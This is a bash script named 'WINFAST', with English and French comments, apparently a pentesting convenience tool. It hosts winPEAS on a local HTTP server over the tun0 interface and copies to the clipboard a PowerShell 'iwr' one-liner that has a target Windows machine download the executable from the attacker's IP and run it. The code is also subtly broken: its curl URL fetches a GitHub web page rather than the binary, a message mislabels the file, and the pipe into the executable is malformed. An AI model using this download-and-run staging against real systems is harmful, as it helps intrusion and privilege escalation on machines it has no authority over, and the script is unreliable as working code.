#!/bin/bash

# ASCII Art and welcome message / ASCII Art et message d'accueil
echo " ____________________________________"
echo "          /WINFAST. \\"
echo "|                                    |"
echo "        \\  By FrozenK     /"
echo " ------------------------------------"
echo "        \   ^__^"
echo "         \  (oo)\_______"
echo "            (__)\       )\/\\"
echo "                ||----w |"
echo "                ||     ||"
echo ""

# By default, use the tun0 interface / Par défaut, utilise l'interface tun0
interface="tun0"

# Analyze command line arguments / Analyse les arguments de ligne de commande
while getopts "i:" opt; do
  case ${opt} in
    i )
      interface=$OPTARG
      ;;
    \? )
      echo "Invalid option / Option invalide: -$OPTARG" 1>&2
      exit 1
      ;;
    : )
      echo "Option -$OPTARG requires an argument / L'option -$OPTARG nécessite un argument." 1>&2
      exit 1
      ;;
  esac
done
shift $((OPTIND -1))

# Check if xclip is installed / Vérifier si xclip est installé
if ! command -v xclip &>/dev/null; then
    # Install xclip with apt / Installer xclip avec apt
    echo "xclip is not installed / xclip n'est pas installé. Installing / Installation en cours..."
    sudo apt update
    sudo apt install xclip
fi

# Get the IP address of the specified interface / Obtenir l'adresse IP de l'interface spécifiée
echo -e "\e[34mGetting the IP address of interface $interface\e[0m"
echo -e "\e[34mObtention de l'adresse IP de l'interface $interface...\n\e[0m"
ip_address=$(ip -o -4 addr show dev $interface | awk '{split($4,a,"/");print a[1]}')

# Store the iwr command in a variable / Stocker la commande iwr dans une variable
wget_command="iwr http://$ip_address/winpeas.exe -O winpeas.exe | .\winpeas.exe"

# Display the command and copy it to the clipboard / Afficher la commande et la copier dans le presse-papier
echo -n "$wget_command" | xclip -selection clipboard

# Download the latest version of winpeas.exe, replacing the existing file / Télécharger la dernière version de winpeas.exe en remplaçant le fichier existant
echo -e "\e[34mDownloading the latest version of winpeas.sh, replacing the existing file\e[0m"
echo -e "\e[34mTéléchargement de la dernière version de winpeas.sh en remplaçant le fichier existant...\e[0m"
curl -Lf https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe -o winpeas.exe 

# Display the wget command with the IP address of the specified interface in red / Afficher la commande wget avec l'adresse IP de l'interface spécifiée en rouge
printf "\nCopy this line : \e[31m\e[7m\e[5m\e[1m%*siwr http://%s:80/winpeas.exe -O winpeas.exe\e[0m\n " $(((${#ip_address} + 12) / 2)) "" "$ip_address"
echo -e "\n"
# Launch a local HTTP server to serve winpeas.exe / Lancer un serveur HTTP local pour servir winpeas.exe
printf "\e[32m\e[1mHTTP server launched on http://%s:80\n ( CTRL+C for STOP )" "$ip_address"
python3 -m http.server 80

# Remove winpeas.exe file when the user stops the web server / Supprimer le fichier winpeas.exe lorsque l'utilisateur arrête le serveur web
echo -e "\n\e[34mStopping the web server. Removing winpeas.exe file... / Arrêt du serveur web. Suppression du fichier winpeas..\e[0m"
echo -e "\e[34mArrêt du serveur web. Suppression du fichier winpeas...\e[0m"
rm winpeas.exe
